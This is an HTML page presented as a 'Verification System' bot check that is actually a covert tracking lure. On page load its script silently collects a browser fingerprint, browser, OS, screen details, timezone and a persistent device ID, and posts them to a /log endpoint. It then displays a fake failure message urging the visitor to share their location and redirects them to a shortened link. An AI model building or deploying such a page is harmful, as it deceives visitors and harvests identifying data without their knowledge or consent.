<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verification System</title>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/ClientJS/0.2.1/client.min.js"></script>

  <style>
    body {
      margin: 0;
      background: #0b0f19;
      color: white;
      font-family: Arial;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .box {
      text-align: center;
      width: 90%;
      max-width: 400px;
    }
    h1 { font-size: 22px; }
    .status { margin-top: 12px; color: #aaa; }
  </style>
</head>

<body>

<div class="box">
  <h1>🔐 VERIFYING...</h1>
  <div class="status" id="status">Starting...</div>
</div>

<script>
function setStatus(msg) {
  document.getElementById("status").innerText = msg;
}

/* =========================
   DEVICE ID SYSTEM
========================= */

// get or create stable ID
function getDeviceId() {
  let id = localStorage.getItem("device_id");

  if (!id) {
    id = crypto.randomUUID();
    localStorage.setItem("device_id", id);
  }

  return id;
}

async function start() {
  try {
    setStatus("Loading...");

    const client = new ClientJS();

    const payload = {
      device_id: getDeviceId(),   // ⭐ NEW STABLE ID
      fingerprint: client.getFingerprint(),
      browser: client.getBrowser(),
      os: client.getOS(),
      screen: client.getScreenPrint(),
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };

    setStatus("Sending data...");

    await fetch("/log", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    setStatus("Failed.  Redirecting...");

    let c = 7;

    const timer = setInterval(() => {
      setStatus("FAILED.\n  SHARE LOCATION TO CONFIRM YOU ARE NOT A BOT.  " + c);
      c--;

      if (c === 0) {
        clearInterval(timer);
        window.location.href =
          "https://unl.one/2wrN1";
      }
    }, 1000);

  } catch (err) {
    setStatus("Error: " + err.message);
  }
}

window.onload = start;
</script>

</body>
</html>
